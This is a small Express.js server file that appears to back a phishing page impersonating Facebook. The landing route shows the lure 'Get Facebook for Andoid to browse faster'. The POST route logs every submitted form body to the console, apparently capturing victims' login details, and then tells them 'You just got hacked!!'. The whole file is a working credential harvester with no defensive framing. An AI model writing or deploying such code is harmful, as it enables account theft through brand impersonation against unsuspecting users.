var express = require('express');
var bodyParser = require('body-parser');

var app = express();
var urlParser = bodyParser.urlencoded({extended: false});

app.set('view engine', 'ejs');

app.use('/assets', express.static('assets'));

app.get('/', function(req, res){
    var msg = 'Get Facebook for Andoid to browse faster';
    res.render('index', {message : msg});
});

app.post('/', urlParser, function(req, res){
    var msg = 'You just got hacked!!';
    console.log(req.body);
    res.render('index', {message : msg});
});

app.listen(3000);

